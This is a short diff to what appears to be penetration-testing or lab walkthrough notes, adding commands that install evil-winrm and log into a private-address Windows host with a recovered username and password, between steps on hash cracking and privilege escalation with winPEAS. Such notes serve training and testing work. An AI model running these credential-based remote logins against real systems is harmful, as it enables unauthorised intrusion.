@@ -511,6 +511,12 @@ Candidates.#01...: alexliamYOUR_SALT_HERE -> LesleeYOUR_SALT_HERE
 
 # try RDP
 
+```bash
+apt search evil-winrm
+apt install evil-winrm -y
+evil-winrm -i 192.168.243.180 -u mike -p Mike14
+```
+
 # Privilege Escalation
 
 ## transfer winPEAS file
